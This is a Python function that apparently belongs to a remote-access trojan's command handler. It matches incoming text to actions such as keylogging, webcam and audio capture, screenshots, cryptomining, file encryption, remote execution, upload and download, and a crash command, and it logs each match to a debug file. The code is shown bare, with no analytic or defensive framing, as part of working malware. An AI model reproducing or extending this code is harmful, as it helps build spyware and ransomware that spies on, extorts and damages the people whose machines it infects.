# Parse incoming commands
def parse_command(text):
    log_path = resource_path('debug.log')
    with open(log_path, "a") as f:
        f.write(f"[+] Parsing command: {text}\n")
    text = text.lower()
    commands = {
        r'\bencrypt\b': "encrypt",
        r'\bmine\b': "mine",
        r'\bscreenshot\b': "screenshot",
        r'\baudio\b': "audio",
        r'\blisten\b': "listen",
        r'\bexecute\b': "execute",
        r'\bupload\b': "upload",
        r'\bdownload\b': "download",
        r'\bxworm\b': "xworm",
        r'\barchive\b': "archive",
        r'\bkeylog\s+start\b': "keylog_start",
        r'\bkeylog\s+stop\b': "keylog_stop",
        r'\bsystem\s+info\b': "system_info",
        r'\brun\b': "run",
        r'\brecord\b': "record",
        r'\bwebcam\b': "webcam",
        r'\bwallpaper\b': "wallpaper",
        r"\bcrash\b": "crash"

    }
    for pattern, cmd in commands.items():
        if re.search(pattern, text):
            with open(log_path, "a") as f:
                f.write(f"[+] Matched command: {cmd}\n")
            return cmd
    with open(log_path, "a") as f:
        f.write("[-] No command matched\n")
    return None

